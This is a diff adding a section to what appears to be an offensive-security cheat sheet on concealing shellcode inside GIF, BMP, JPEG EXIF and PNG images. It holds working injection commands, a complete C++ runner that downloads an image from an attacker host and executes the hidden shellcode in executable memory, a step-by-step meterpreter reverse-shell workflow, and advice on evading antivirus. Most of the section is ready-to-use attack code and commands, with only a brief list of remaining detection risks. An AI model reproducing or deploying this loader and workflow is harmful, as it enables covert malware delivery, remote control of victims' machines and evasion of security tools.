@@ -622,3 +622,128 @@ python.exe micr0_shell.py -i 10.10.14.5 -p 8080 -l csharp
 # Listener on attacker:
 nc -lvnp 8080
 # Run on target: RShell.exe 10.10.14.5 8080</code></pre>
+
+  <h2>Image-Based Payload Concealment (ImgPayload)</h2>
+  <p>Shellcode can be concealed inside valid image files using EOF markers, EXIF metadata, or LSB steganography. The image file passes AV file scanning and appears legitimate; a C++ runner downloads the image, locates the hidden shellcode at a known offset, and executes it. Technique based on the ImgPayload tool (Python, Pillow/piexif).</p>
+
+  <h3>Injection Techniques</h3>
+  <pre><code># Install:
+pip install pillow piexif
+
+# --- Technique 1: EOF / BMP / GIF injection ---
+# Appends shellcode after the image's end marker, separated by "/////" and ";".
+# The image remains viewable; parsers stop at the image end marker.
+
+python3 imgect.py --gif -f payload.bin -i cover.gif -o output.gif
+python3 imgect.py --bmp -f payload.bin -o bmp_payload
+# With XOR encoding:
+python3 imgect.py --gif -f payload.bin --encode -k SUPERSECRET -o encoded.gif
+
+# Output shows the byte offset to the shellcode start:
+# [&gt;] Use this offset in your C++ loader:
+#     const size_t shellcodeStart = 36;
+
+# --- Technique 2: EXIF metadata injection ---
+# Stores shellcode in the JPEG UserComment EXIF field.
+# Survives most image re-hosting (unless the host strips EXIF).
+
+python3 imgect.py --exif -f payload.bin -i photo.jpg -o img_exif.jpg
+
+# Extraction: parse UserComment field with piexif, base64-decode, XOR-decode if encoded.
+
+# --- Technique 3: LSB steganography ---
+# Hides shellcode bit-by-bit in the 3 least-significant bits of each RGB pixel.
+# Invisible to the naked eye; requires PNG (lossless — JPEG destroys LSBs).
+
+python3 imgect.py --lsb -f payload.bin -i cover.png -o steg_img.png
+
+# Extraction: read 3 LSBs from each pixel channel, recombine bytes to restore shellcode.
+# The visible image is nearly identical to the original.</code></pre>
+
+  <h3>C++ Runner (WinInet Download + Execution)</h3>
+  <pre><code>// Runner downloads the image from a URL, extracts shellcode at a known offset,
+// and executes it via VirtualAlloc + direct function cast.
+// Compile: cl.exe /EHsc Runner.cpp wininet.lib
+
+#include &lt;windows.h&gt;
+#include &lt;wininet.h&gt;
+#include &lt;iostream&gt;
+#include &lt;vector&gt;
+#include &lt;fstream&gt;
+#pragma comment(lib, "wininet.lib")
+
+const char* imageURL = "http://ATTACKER_IP:PORT/payload.gif";
+const char* imageFilename = "payload.gif";
+const size_t shellcodeOffset = 36;   // from ImgPayload output
+
+bool downloadImage(const char* url, const char* outputFile) {
+    HINTERNET hInternet = InternetOpenA("ShellcodeRunner",
+                           INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0,
+                           INTERNET_FLAG_RELOAD, 0);
+    std::ofstream outFile(outputFile, std::ios::binary);
+    char buffer[4096]; DWORD bytesRead;
+    while (InternetReadFile(hFile, buffer, sizeof(buffer), &amp;bytesRead) &amp;&amp; bytesRead)
+        outFile.write(buffer, bytesRead);
+    InternetCloseHandle(hFile); InternetCloseHandle(hInternet);
+    return true;
+}
+
+int main() {
+    downloadImage(imageURL, imageFilename);
+    std::ifstream file(imageFilename, std::ios::binary | std::ios::ate);
+    std::streamsize fileSize = file.tellg(); file.seekg(0);
+    std::vector&lt;char&gt; buffer(fileSize);
+    file.read(buffer.data(), fileSize);
+
+    size_t shellcodeSize = fileSize - shellcodeOffset;
+    void* execMem = VirtualAlloc(nullptr, shellcodeSize,
+                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(execMem, buffer.data() + shellcodeOffset, shellcodeSize);
+    reinterpret_cast&lt;void(*)()&gt;(execMem)();   // execute shellcode
+    return 0;
+}</code></pre>
+
+  <h3>Full Workflow</h3>
+  <pre><code># 1. Generate shellcode:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin
+
+# 2. Embed in image:
+python3 imgect.py --gif -f payload.bin -i legit.gif -o output.gif
+# Note the reported shellcodeStart offset
+
+# 3. Host the image:
+python3 -m http.server 8080
+
+# 4. Compile the runner with correct offset:
+# Edit Runner.cpp: shellcodeOffset = &lt;value from step 2&gt;
+# Edit Runner.cpp: imageURL = "http://10.10.14.5:8080/output.gif"
+cl.exe /EHsc Runner.cpp wininet.lib
+# OR cross-compile from Linux:
+x86_64-w64-mingw32-g++ Runner.cpp -o runner.exe -lwininet
+
+# 5. Start handler:
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"
+
+# 6. Execute runner.exe on target — fetches image, extracts shellcode, executes</code></pre>
+
+  <h3>AV Evasion Properties</h3>
+  <pre><code># What this bypasses:
+# - Static file signature scanning: runner.exe contains no shellcode bytes
+# - URL reputation checks: image URL looks like a legitimate asset request
+# - EXIF/GIF/BMP file format parsers used by some AV products may not
+#   inspect bytes beyond the image end marker
+# - LSB steganography is undetectable by standard AV (purely visual inspection)
+
+# Detection risks remaining:
+# - WinInet HTTP download from non-browser process (behavioral)
+# - VirtualAlloc(PAGE_EXECUTE_READWRITE) in a process that handles image files
+# - Memory scan after allocation: shellcode bytes in RWX region
+#   Mitigate: RW alloc → copy → VirtualProtect RX
+# - DNS/network request to untrusted host before shellcode execution
+
+# Improving evasion:
+# - XOR-encode shellcode in image (-k key): decodes only after download, no static match
+# - Use EXIF injection: harder for AV to extract from JPEG EXIF fields
+# - Serve image over HTTPS from a CDN (blend with normal traffic)
+# - Use a named pipe or legitimate process for shellcode injection instead of self-exec</code></pre>
